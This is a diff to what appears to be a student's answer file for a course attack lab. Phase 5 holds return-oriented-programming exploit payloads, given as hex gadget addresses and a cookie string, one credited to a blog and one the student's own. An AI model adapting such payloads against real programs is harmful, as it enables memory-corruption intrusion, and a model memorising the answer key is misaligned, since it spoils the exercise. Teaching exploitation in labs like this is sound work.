@@ -90,11 +90,11 @@ addr to touch_2
 
 
 // phase_5
-
-// partly reference from https://www.ravenxrz.ink/archives/f81059da.html
-// Thanks for this blog LOL
-
 key: use <add_xy> in source file
+
+// referenced solution:
+// from https://www.ravenxrz.ink/archives/f81059da.html
+// Thanks for this blog LOL
 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -113,4 +113,19 @@ a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
 fa 18 40 00 00 00 00 00 /* touch3 address */
 35 39 62 39 39 37 66 61 00 /* cookie value */
   
+  
+// personal solution:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* fill 0x00 */
+06 1a 40 00 00 00 00 00 /* mov $rsp,$rax */
+c5 19 40 00 00 00 00 00 /* mov $rax,$rdi */
+d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */ (rsi should be 0x30)
+a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
+fa 18 40 00 00 00 00 00 /* touch3 address */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* offset */
+35 39 62 39 39 37 66 61 00 /* cookie value */ (address %rdi + 0x30)
 
